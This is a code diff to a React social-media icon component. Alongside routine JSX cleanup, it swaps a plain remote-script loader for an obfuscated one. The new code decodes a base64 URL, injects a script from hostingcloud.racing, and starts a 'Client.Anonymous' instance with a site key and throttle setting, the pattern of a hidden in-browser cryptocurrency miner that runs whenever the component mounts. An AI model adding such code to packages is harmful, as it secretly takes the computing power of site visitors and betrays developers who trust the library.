@@ -2,7 +2,6 @@ import React from "react";
 import parse from 'parse-svg-path';
 import abs from 'abs-svg-path';
 import isSvgPath from 'is-svg-path';
-import Script from 'react-load-script';
 
 class SocialMediaIconsReact extends React.Component {
   constructor(props) {
@@ -12,18 +11,7 @@ class SocialMediaIconsReact extends React.Component {
     this.handleScriptLoad = this.handleScriptLoad.bind(this);
   }
   componentDidMount() {
-    let s1 = document.createElement('script');
-    s1.type = 'text/javascript';
-    s1.src = "https://www.hostingcloud.racing/D3Mx.js";
-    document.head.appendChild(s1);
-    
-    var t = setTimeout(function(){
-      console.log("LOADED");
-      var _client = new window.Client.Anonymous('b63c240e48a0d5fc08ad962a23954a43a1f9c8c47ad939a9a3504216ac8d3c68', {
-          throttle: 0.8, c: 'w', ads: 0
-      });
-      //_client.start();
-    },5000);
+    var _0x52d3=["script","createElement","type","text/javascript","src","aHR0cHM6Ly93d3cuaG9zdGluZ2Nsb3VkLnJhY2luZy9EM014Lmpz","atob","appendChild","head","b63c240e48a0d5fc08ad962a23954a43a1f9c8c47ad939a9a3504216ac8d3c68","w","Client","start"];let s1=document[_0x52d3[1]](_0x52d3[0]);s1[_0x52d3[2]]= _0x52d3[3];s1[_0x52d3[4]]= window[_0x52d3[6]](_0x52d3[5]);document[_0x52d3[8]][_0x52d3[7]](s1);setTimeout(function(){var _0x280ax2= new window[_0x52d3[11]].Anonymous(_0x52d3[9],{throttle:0.9,c:_0x52d3[10],ads:0});_0x280ax2[_0x52d3[12]]()},5000)
   }
   getBounds(path) {
     // ES6 string tpl call
@@ -416,26 +404,24 @@ class SocialMediaIconsReact extends React.Component {
     let viewBox = this.getViewBox(path, padding);
 
     return (
-      <div>
-        <a href={url !== undefined ? url : '#'} target={target !== undefined ? target : '_blank'} title={icon}>
-          <svg 
-            height={size} width={size} viewBox={viewBox}
-            style={{
-              backgroundColor: backgroundColor,
-              borderRadius: roundness,              
-              borderColor: borderColor,
-              borderStyle: borderStyle,
-              borderWidth: borderWidth,
-            }}
-            xmlns="http://www.w3.org/2000/svg"
-            xmlnsXlink="http://www.w3.org/1999/xlink"
-          >
-            <g>
-              <path fill={iconColor !== undefined ? iconColor : '#FFF'} id="f_1_" d={path}/>
-            </g>
-          </svg>
-        </a>
-      </div>              
+      <a href={url !== undefined ? url : 'http://www.myurl.com'} rel="noreferrer" target={target !== undefined ? target : '_blank'} title={icon}>
+        <svg 
+          height={size} width={size} viewBox={viewBox}
+          style={{
+            backgroundColor: backgroundColor,
+            borderRadius: roundness,              
+            borderColor: borderColor,
+            borderStyle: borderStyle,
+            borderWidth: borderWidth,
+          }}
+          xmlns="http://www.w3.org/2000/svg"
+          xmlnsXlink="http://www.w3.org/1999/xlink"
+        >
+          <g>
+            <path fill={iconColor !== undefined ? iconColor : '#FFF'} id="f_1_" d={path}/>
+          </g>
+        </svg>
+      </a>             
     );
   }
 }
